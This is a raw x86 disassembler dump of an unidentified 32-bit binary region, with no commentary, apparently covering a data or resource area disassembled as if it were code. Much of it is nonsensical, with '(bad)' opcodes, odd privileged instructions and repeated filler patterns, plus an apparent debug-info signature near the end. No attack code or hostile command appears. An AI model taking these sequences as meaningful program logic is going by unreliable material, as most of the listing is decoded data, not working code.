  433467:	mov    esi,DWORD PTR [ebx]
  433469:	fmul   QWORD PTR [ebx+0x55c7fc00]
  43346f:	test   BYTE PTR [ebx],dh
  433471:	dec    ebx
  433472:	add    esi,DWORD PTR [edx]
  433474:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  43347a:	dec    edi
  43347c:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  433483:	xor    al,BYTE PTR [ebx]
  433485:	mov    edi,DWORD PTR [ebx]
  433487:	in     al,0x75
  433489:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  43348f:	dec    ebx
  433490:	xor    esi,DWORD PTR [edx]
  433492:	lea    ecx,[edx]
  433494:	or     BYTE PTR [ebx+0x900f072],cl
  43349a:	ja     0x43346b
  43349c:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  4334a3:	cmp    ch,al
  4334a5:	jne    0x43349a
  4334a7:	mov    edi,edi
  4334a9:	fadd   QWORD PTR [ebp+0x0]
  4334ac:	mov    eax,edi
  4334ae:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  4334b5:	mov    edx,DWORD PTR [ebx]
  4334b7:	in     al,0x45
  4334b9:	or     DWORD PTR [ebx],esi
  4334bb:	iret   
  4334bc:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  4334c3:	xor    dl,BYTE PTR [eax-0x75]
  4334c6:	sbb    al,0xe0
  4334c8:	dec    DWORD PTR [ecx]
  4334ca:	mov    ecx,edi
  4334cc:	in     al,dx
  4334cd:	mov    eax,es
  4334cf:	dec    ebx
  4334d0:	mov    DWORD PTR [edx],esi
  4334d2:	fmul   QWORD PTR [edx]
  4334d4:	jne    0x433461
  4334d6:	(bad)  
  4334d7:	(bad)  
  4334d9:	or     DWORD PTR [ebp-0x31],eax
  4334dc:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  4334e3:	cmp    bh,bh
  4334e5:	jne    0x43352c
  4334e7:	lea    ecx,[ebx-0x38372750]
  4334ed:	inc    ebx
  4334ef:	mov    eax,ecx
  4334f1:	mov    eax,0xa00c111
  4334f6:	jne    0x43353d
  4334f8:	mov    esi,DWORD PTR [ebx]
  4334fa:	test   al,0x3
  4334fc:	inc    ebp
  4334fd:	mov    DWORD PTR [eax-0xc],edx
  433500:	loop   0x433547
  433502:	push   DWORD PTR [ebx]
  433504:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  43350a:	add    DWORD PTR [eax],eax
  43350c:	mov    eax,edi
  43350e:	lods   al,BYTE PTR ds:[esi]
  43350f:	dec    ebp
  433510:	inc    ebp
  433511:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433517:	retf   
  433518:	mov    edx,ecx
  43351a:	adc    al,0x84
  43351c:	(bad)  
  43351d:	std    
  43351e:	ret    
  43351f:	jmp    FWORD PTR [edi-0x2b7474bb]
  433525:	hlt    
  433526:	rol    edi,0x82
  433529:	ret    
  43352a:	cld    
  43352b:	enter  0x11ff,0x45
  43352f:	inc    ebp
  433530:	pop    edi
  433531:	mov    ebx,DWORD PTR [ebx+0x14]
  433534:	ret    0xc7
  433537:	test   BYTE PTR [ebx+0x4532519b],cl
  43353d:	jmp    0x4334ca
  43353f:	push   0x8
  433541:	call   DWORD PTR [esi]
  433543:	in     al,dx
  433544:	add    BYTE PTR [ebp+0x1],0x50
  433548:	add    bh,ah
  43354a:	add    bh,bh
  43354c:	icebp  
  43354d:	mov    ecx,DWORD PTR [eax]
  43354f:	cld    
  433550:	pop    es
  433551:	dec    ebp
  433552:	shl    DWORD PTR [ebx],0x72
  433555:	add    eax,DWORD PTR [eax]
  433557:	cmp    edx,ecx
  433559:	je     0x43356b
  43355b:	mov    esi,DWORD PTR [ebp-0x4]
  43355e:	inc    edi
  433560:	or     al,0xc3
  433562:	jmp    FWORD PTR [edx-0x18]
  433565:	(bad)  
  433566:	sti    
  433567:	cwde   
  433568:	(bad)  
  433569:	call   0xffa12e74
  43356e:	or     al,0x45
  433570:	push   ebp
  433571:	sub    esp,0x18
  433574:	push   ebx
  433575:	inc    ebp
  433576:	mov    edi,edi
  433578:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  43357f:	test   al,0x54
  433581:	inc    ebp
  433582:	push   ecx
  433583:	push   eax
  433584:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  43358a:	add    ah,bh
  43358c:	(bad)  
  43358d:	dec    ebp
  43358e:	add    DWORD PTR [ebx],esi
  433590:	inc    ebp
  433591:	add    ecx,DWORD PTR [ebx+0x74943b]
  433597:	push   0xffffff8b
  433599:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43359f:	add    eax,DWORD PTR [ecx]
  4335a1:	or     BYTE PTR [eax],al
  4335a3:	call   0xff852da8
  4335a8:	mov    eax,DWORD PTR [ebp+0x14]
  4335ab:	mov    ecx,DWORD PTR [ecx+0x801ac]
  4335b1:	inc    ebp
  4335b2:	dec    ecx
  4335b3:	add    ebp,DWORD PTR [edx+0x14]
  4335b6:	push   0x8b3045
  4335bb:	call   0x33ad8330
  4335c0:	inc    DWORD PTR [ebx]
  4335c2:	mov    DWORD PTR [edi],ecx
  4335c4:	mov    eax,ecx
  4335c6:	or     BYTE PTR [ebp-0x3d],cl
  4335c9:	cmp    eax,edi
  4335cb:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  4335d0:	adc    BYTE PTR [ebx+0x5eff0845],cl
  4335d6:	adc    al,0xc9
  4335d8:	inc    ebp
  4335d9:	adc    BYTE PTR [eax+0x55],dl
  4335dc:	jne    0x4335ca
  4335de:	call   0xff54356e
  4335e3:	dec    ebp
  4335e4:	inc    ebp
  4335e5:	mov    ecx,DWORD PTR [ebx+0x390338b]
  4335eb:	add    BYTE PTR [ebx],bh
  4335ed:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  4335f1:	push   esp
  4335f2:	or     al,0x51
  4335f4:	dec    ebp
  4335f5:	xor    DWORD PTR [ebx],0xf32039b
  4335fb:	cmp    eax,DWORD PTR [ebp+0x74]
  4335fe:	mov    edi,edi
  433600:	pop    edi
  433601:	adc    BYTE PTR [ebx+0x75],bl
  433604:	ret    0x50
  433607:	mov    edx,DWORD PTR ss:[edi-0x7d]
  43360b:	(bad)  
  43360c:	clc    
  43360d:	mov    esp,ebp
  43360f:	pop    ecx
  433610:	mov    ecx,0xf80085c2
  433615:	mov    ecx,DWORD PTR [ecx+edx*2]
  433618:	push   esi
  433619:	push   esi
  43361a:	(bad)  
  43361b:	lock add DWORD PTR [ebp+0x44],eax
  43361f:	mov    edx,DWORD PTR [eax]
  433621:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433625:	or     BYTE PTR [edi+eax*1+0x51],dl
  433629:	ret    
  43362a:	xor    ebx,DWORD PTR [ebx+0x37232be]
  433630:	add    BYTE PTR [ecx+0x147c8bfe],cl
  433636:	or     al,0x80
  433638:	jge    0x43363b
  43363a:	mov    DWORD PTR [eax],eax
  43363c:	and    al,0x8
  43363e:	cmp    DWORD PTR [ebp+0x10],eax
  433641:	mov    edx,DWORD PTR [esi]
  433643:	xchg   esp,eax
  433644:	dec    esp
  433645:	add    BYTE PTR [eax],dl
  433647:	mov    ecx,edx
  433649:	add    edx,DWORD PTR [esp+edi*1+0x8]
  43364d:	dec    ebp
  43364e:	into   
  43364f:	mov    ebp,DWORD PTR [edi+0x240089d8]
  433655:	mov    edx,DWORD PTR [eax+0x14]
  433658:	das    
  433659:	add    al,0x45
  43365b:	add    BYTE PTR [ebp+0x0],dh
  43365e:	mov    edi,edi
  433660:	and    al,0x50
  433662:	mov    eax,DWORD PTR [eax]
  433664:	and    al,0xd1
  433666:	xor    eax,DWORD PTR [esi]
  433668:	lea    eax,[ebp+0x8]
  43366b:	xor    esi,DWORD PTR [edx+0x3]
  43366e:	add    BYTE PTR [ecx+0x4510fc44],cl
  433674:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  43367a:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  433684:	cmp    al,0xff
  433686:	pushf  
  433687:	mov    edi,edi
  433689:	or     BYTE PTR [esi+ecx*1],cl
  43368c:	jne    0x433651
  43368e:	call   0xc365a
  433693:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433697:	mov    ebx,DWORD PTR [eax]
  433699:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  43369d:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  4336a5:	pop    esi
  4336a6:	and    al,0xc9
  4336a8:	call   DWORD PTR [eax]
  4336aa:	and    al,0x55
  4336ac:	call   0x28359d
  4336b1:	add    DWORD PTR [eax+edx*1+0xc],0x31
  4336b6:	clc    
  4336b7:	pushf  
  4336b8:	dec    DWORD PTR [ecx+0x57892474]
  4336be:	jmp    0x433701
  4336c0:	and    al,0x89
  4336c2:	and    al,0x24
  4336c4:	or     BYTE PTR [ebx-0x45ebdbe8],cl
  4336ca:	dec    DWORD PTR [eax]
  4336cc:	and    al,0x7
  4336ce:	pop    esi
  4336cf:	cli    
  4336d0:	in     eax,0x9b
  4336d2:	ret    0x32
  4336d5:	add    eax,edx
  4336d7:	mov    DWORD PTR [ebx+0x688b8924],ebx
  4336dd:	or     al,0xf8
  4336df:	jl     0x43375e
  4336e1:	adc    al,0x9c
  4336e3:	dec    ebp
  4336e4:	push   0xff8b7575
  4336e9:	and    al,0xff
  4336eb:	xor    edi,edi
  4336ed:	mov    esi,DWORD PTR [esp-0x75]
  4336f1:	add    ecx,DWORD PTR [ebx+0x4cca0c0f]
  4336f7:	or     bl,ch
  4336f9:	cmp    DWORD PTR [eax],edx
  4336fb:	sbb    al,0x44
  4336fd:	or     BYTE PTR [eax+edx*1-0x7c],cl
  433701:	xor    ah,BYTE PTR [eax*4-0x7a8accf2]
  433708:	or     BYTE PTR [ecx*4+0x5d5fbf74],ah
  43370f:	test   eax,0x83001010
  433714:	dec    eax
  433715:	adc    BYTE PTR [eax],al
  433717:	adc    edi,DWORD PTR [edx+0x10]
  43371a:	add    cl,bh
  43371c:	jae    0x43372e
  43371e:	add    BYTE PTR [ebx-0x4bffefb4],dh
  433724:	pop    eax
  433725:	adc    BYTE PTR [eax],al
  433727:	fidiv  DWORD PTR [ebp+0x10]
  43372a:	add    dh,bl
  43372c:	movups xmm0,XMMWORD PTR [eax]
  43372f:	popf   
  433730:	push   cs
  433731:	adc    BYTE PTR [eax],al
  433733:	ins    DWORD PTR es:[edi],dx
  433734:	or     BYTE PTR [eax],dl
  433736:	add    BYTE PTR [ebx+eiz*2+0x370f0010],cl
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [ebx],dl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [edi],dl
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [ebx],bl
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [edi],bl
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [ebx],ah
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [edi],ah
  433754:	aaa    
  433755:	inc    ebx
  433756:	add    BYTE PTR [ebx],ch
  433758:	aaa    
  433759:	inc    ebx
  43375a:	add    BYTE PTR [edi],ch
  43375c:	aaa    
  43375d:	inc    ebx
  43375e:	add    BYTE PTR [ebx],dh
  433760:	aaa    
  433761:	inc    ebx
  433762:	add    BYTE PTR [edi],dh
  433764:	aaa    
  433765:	inc    ebx
  433766:	add    BYTE PTR [ebx-0x73ffefdd],bh
  43376c:	cmp    al,0x10
  43376e:	add    BYTE PTR [ebx+0x30],cl
  433771:	adc    BYTE PTR [eax],al
  433773:	sub    al,0xc
  433775:	adc    BYTE PTR [eax],al
  433777:	push   ds
  433778:	adc    BYTE PTR ds:[eax],al
  43377b:	mov    bh,0x56
  43377d:	adc    BYTE PTR [eax],al
  43377f:	adc    eax,DWORD PTR [eax+edx*1+0x0]
  433783:	cmp    al,0x4f
  433785:	adc    BYTE PTR [eax],al
  433787:	addr16 aaa 
  433789:	inc    ebx
  43378a:	add    BYTE PTR [ebx+0x37],ch
  43378d:	inc    ebx
  43378e:	add    BYTE PTR [edi+0x37],ch
  433791:	inc    ebx
  433792:	add    BYTE PTR [ebx+0x37],dh
  433795:	inc    ebx
  433796:	add    BYTE PTR [edi+0x37],dh
  433799:	inc    ebx
  43379a:	add    BYTE PTR [ebx+0x37],bh
  43379d:	inc    ebx
  43379e:	add    BYTE PTR [edi+0x37],bh
  4337a1:	inc    ebx
  4337a2:	add    BYTE PTR [ebx-0x23ffbcc9],al
  4337a8:	pop    esp
  4337a9:	adc    BYTE PTR [eax],al
  4337ab:	jle    0x4337cd
  4337ad:	adc    BYTE PTR [eax],al
  4337af:	cld    
  4337b0:	dec    edx
  4337b1:	adc    BYTE PTR [eax],al
  4337b3:	add    al,0xb
  4337b5:	adc    BYTE PTR [eax],al
  4337b7:	push   ebx
  4337b8:	ins    DWORD PTR es:[edi],dx
  4337b9:	adc    BYTE PTR [eax],al
  4337bb:	fs jl  0x4337ce
  4337be:	add    BYTE PTR [edx+0x42001015],ah
  4337c4:	jge    0x4337d6
  4337c6:	add    BYTE PTR [edi-0x54ffbcc9],ah
  4337cc:	aaa    
  4337cd:	inc    ebx
  4337ce:	add    BYTE PTR [edi-0x4cffbcc9],ch
  4337d4:	aaa    
  4337d5:	inc    ebx
  4337d6:	add    BYTE PTR [edi-0x44ffbcc9],dh
  4337dc:	aaa    
  4337dd:	inc    ebx
  4337de:	add    BYTE PTR [edi-0x3cffbcc9],bh
  4337e4:	aaa    
  4337e5:	inc    ebx
  4337e6:	add    BYTE PTR [edi+0x2300103a],ah
  4337ec:	aas    
  4337ed:	adc    BYTE PTR [eax],al
  4337ef:	jne    0x4337fc
  4337f1:	adc    BYTE PTR [eax],al
  4337f3:	fldenv [esi]
  4337f5:	adc    BYTE PTR [eax],al
  4337f7:	xchg   esp,eax
  4337f8:	push   0x10
  4337fa:	add    bl,ah
  4337fc:	pop    eax
  4337fd:	adc    BYTE PTR [eax],al
  4337ff:	in     al,0x2f
  433801:	adc    BYTE PTR [eax],al
  433803:	leave  
  433804:	sbb    DWORD PTR [eax],edx
  433806:	add    bh,ah
  433808:	aaa    
  433809:	inc    ebx
  43380a:	add    bl,ch
  43380c:	aaa    
  43380d:	inc    ebx
  43380e:	add    bh,ch
  433810:	aaa    
  433811:	inc    ebx
  433812:	add    bl,dh
  433814:	aaa    
  433815:	inc    ebx
  433816:	add    bh,dh
  433818:	aaa    
  433819:	inc    ebx
  43381a:	add    bl,bh
  43381c:	aaa    
  43381d:	inc    ebx
  43381e:	add    bh,bh
  433820:	aaa    
  433821:	inc    ebx
  433822:	add    BYTE PTR [ebx],al
  433824:	cmp    BYTE PTR [ebx+0x0],al
  433827:	mov    ebp,0x1d001062
  43382c:	adc    BYTE PTR [eax],dl
  43382e:	add    BYTE PTR [edi+0x51],dl
  433831:	adc    BYTE PTR [eax],al
  433833:	dec    eax
  433834:	ins    DWORD PTR es:[edi],dx
  433835:	adc    BYTE PTR [eax],al
  433837:	mov    eax,DWORD PTR [edi]
  433839:	adc    BYTE PTR [eax],al
  43383b:	mov    ah,0x7
  43383d:	adc    BYTE PTR [eax],al
  43383f:	ror    DWORD PTR [esi],1
  433841:	adc    BYTE PTR [eax],al
  433843:	pop    edi
  433844:	inc    ebp
  433845:	adc    BYTE PTR [eax],al
  433847:	daa    
  433848:	cmp    BYTE PTR [ebx+0x0],al
  43384b:	sub    edi,DWORD PTR [eax]
  43384d:	inc    ebx
  43384e:	add    BYTE PTR [edi],ch
  433850:	cmp    BYTE PTR [ebx+0x0],al
  433853:	xor    edi,DWORD PTR [eax]
  433855:	inc    ebx
  433856:	add    BYTE PTR [edi],dh
  433858:	cmp    BYTE PTR [ebx+0x0],al
  43385b:	cmp    edi,DWORD PTR [eax]
  43385d:	inc    ebx
  43385e:	add    BYTE PTR [edi],bh
  433860:	cmp    BYTE PTR [ebx+0x0],al
  433863:	inc    ebx
  433864:	cmp    BYTE PTR [ebx+0x0],al
  433867:	dec    ecx
  433868:	ss push eax
  43386a:	pop    edi
  43386b:	ss inc ebx
  43386d:	ss pop edx
  43386f:	xor    ebx,DWORD PTR [edi+0x52]
  433872:	add    BYTE PTR [edi+ecx*2+0x32],dl
  433876:	pop    edi
  433877:	dec    esi
  433878:	dec    esp
  433879:	dec    eax
  43387a:	xor    esi,DWORD PTR [edx]
  43387c:	pop    edi
  43387d:	xor    al,0x4b
  43387f:	add    BYTE PTR [eax+0x49],cl
  433882:	push   ebp
  433883:	xor    al,0x5f
  433885:	dec    esp
  433886:	inc    edx
  433887:	dec    ecx
  433888:	cmp    DWORD PTR [edi+ebx*2],esi
  43388b:	pop    ecx
  43388c:	inc    edi
  43388d:	add    BYTE PTR [eax+0x50],bl
  433890:	dec    eax
  433891:	pop    edi
  433892:	push   ebp
  433893:	push   ecx
  433894:	inc    edi
  433895:	xor    cl,BYTE PTR [edx+0x38]
  433898:	push   esi
  433899:	add    BYTE PTR [ebx+0x4a],al
  43389c:	push   edx
  43389d:	pop    edi
  43389e:	dec    edi
  43389f:	dec    eax
  4338a0:	dec    edi
  4338a1:	dec    edi
  4338a2:	dec    edx
  4338a3:	add    BYTE PTR [ecx+0x52],al
  4338a6:	cmp    DWORD PTR [edi+0x56],ebx
  4338a9:	aaa    
  4338aa:	dec    esp
  4338ab:	cmp    DWORD PTR [ebx+0x5f],eax
  4338ae:	push   edx
  4338af:	inc    esp
  4338b0:	add    BYTE PTR [ecx+0x37],bl
  4338b3:	inc    esp
  4338b4:	pop    edi
  4338b5:	dec    ecx
  4338b6:	xor    esi,DWORD PTR [edi]
  4338b8:	xor    DWORD PTR [edi+0x49],ebx
  4338bb:	push   esp
  4338bc:	xor    eax,DWORD PTR [eax]
  4338be:	push   edx
  4338bf:	xor    BYTE PTR [eax+0x5f],bl
  4338c2:	dec    eax
  4338c3:	push   edi
  4338c4:	inc    esi
  4338c5:	xor    DWORD PTR [edi+0x5f],edx
  4338c8:	cmp    BYTE PTR [ebx+0x37],dl
  4338cb:	add    BYTE PTR [esi+0x42],dl
  4338ce:	dec    ecx
  4338cf:	xor    ebx,DWORD PTR [edi+0x45]
  4338d2:	xor    BYTE PTR [ebp+0x5f],cl
  4338d5:	xor    al,0x34
  4338d7:	xor    BYTE PTR [edx+0x5f],cl
  4338da:	inc    edi
  4338db:	add    BYTE PTR [edx+0x57],dl
  4338de:	xor    ebx,DWORD PTR [edi+0x31]
  4338e1:	dec    edx
  4338e2:	push   edi
  4338e3:	xor    eax,0x4d435f
  4338e8:	dec    ecx
  4338e9:	xor    eax,0x36365f39
  4338ee:	dec    eax
  4338ef:	xor    BYTE PTR [eax],al
  4338f1:	dec    edi
  4338f2:	inc    ebx
  4338f3:	push   edi
  4338f4:	pop    edi
  4338f5:	inc    edi
  4338f6:	xor    al,BYTE PTR ss:[ecx+esi*1+0x4a]
  4338fb:	add    BYTE PTR [edx+0x0],al
  4338fe:	pop    eax
  4338ff:	add    BYTE PTR [edi+0x0],al
  433902:	add    BYTE PTR ss:[edi+0x0],bl
  433906:	push   esi
  433907:	add    BYTE PTR [ebx+0x0],al
  43390a:	dec    esi
  43390b:	add    BYTE PTR [eax+eax*1+0x0],al
  43390f:	add    BYTE PTR [edi+0x0],cl
  433912:	dec    ebp
  433913:	add    BYTE PTR [edi+0x0],al
  433916:	xor    eax,DWORD PTR [eax]
  433918:	pop    edi
  433919:	add    BYTE PTR [eax+eax*1],dh
  43391c:	dec    esi
  43391d:	add    BYTE PTR [edx+0x0],bl
  433920:	cmp    BYTE PTR [eax],al
  433922:	pop    edi
  433923:	add    BYTE PTR [eax+0x0],bl
  433926:	cmp    BYTE PTR [eax],al
  433928:	add    BYTE PTR [eax],al
  43392a:	push   edx
  43392b:	add    BYTE PTR [eax+0x0],bl
  43392e:	push   ecx
  43392f:	add    BYTE PTR [edi+0x0],bl
  433932:	dec    esp
  433933:	add    BYTE PTR [edx+0x0],dl
  433936:	dec    ecx
  433937:	add    BYTE PTR [edi+0x0],cl
  43393a:	inc    esp
  43393b:	add    BYTE PTR [edi+0x0],bl
  43393e:	dec    edi
  43393f:	add    BYTE PTR [ebx],dh
  433941:	add    BYTE PTR [eax+eax*1+0x0],al
  433945:	add    BYTE PTR [ebx+0x0],al
  433948:	push   eax
  433949:	add    BYTE PTR [ebp+0x0],al
  43394c:	pop    edi
  43394d:	add    BYTE PTR ds:0x39004500,dh
  433953:	add    BYTE PTR [edi+0x0],bl
  433956:	push   esi
  433957:	add    BYTE PTR [eax],al
  433959:	add    BYTE PTR [edi+0x0],al
  43395c:	dec    esi
  43395d:	add    BYTE PTR [esi+0x0],dl
  433960:	pop    edi
  433961:	add    BYTE PTR [edi+0x0],al
  433964:	push   esp
  433965:	add    BYTE PTR [eax+0x0],cl
  433968:	xor    al,BYTE PTR [eax]
  43396a:	xor    DWORD PTR [eax],eax
  43396c:	pop    edi
  43396d:	add    BYTE PTR [edi+0x0],cl
  433970:	add    BYTE PTR ss:[ebx],dh
  433973:	add    BYTE PTR [eax],al
  433975:	add    BYTE PTR [eax+eax*1+0x45],al
  433979:	add    BYTE PTR [ecx+0x0],cl
  43397c:	pop    edi
  43397d:	add    BYTE PTR [edx+0x0],dl
  433980:	dec    eax
  433981:	add    BYTE PTR [eax+eax*1],dh
  433984:	dec    eax
  433985:	add    BYTE PTR [eax],al
  433987:	add    BYTE PTR [eax],al
  433989:	push   edx
  43398a:	push   ebx
  43398b:	inc    esp
  43398c:	push   ebx
  43398d:	jbe    0x4339ed
  43398f:	test   DWORD PTR [ebx+0x41303d0c],esp
  433995:	test   DWORD PTR [esi],edi
  433997:	adc    ecx,DWORD PTR [ebp-0x5ed99308]
  43399d:	push   cs
  43399e:	add    BYTE PTR [eax],al
  4339a0:	add    BYTE PTR [ecx+0x3a],dl
  4339a3:	pop    esp
  4339a4:	js     0x4339fe
  4339a6:	ins    DWORD PTR es:[edi],dx
  4339a7:	arpl   WORD PTR [esi+0x76],sp
  4339aa:	addr16 jp 0x433a21
  4339ad:	pop    esp
  4339ae:	inc    ebp
  4339af:	inc    esi
  4339b0:	dec    edx
  4339b1:	bound  ebp,QWORD PTR [edx+0x67]
  4339b4:	popa   
  4339b5:	push   0x6c776a5c
  4339ba:	bound  esp,QWORD PTR [eax+ebp*2+0x70]
  4339be:	popa   
  4339bf:	bound  esi,QWORD PTR [edi+0x65]
  4339c2:	cs jo  0x433a29
  4339c5:	bound  eax,QWORD PTR [eax]
	...
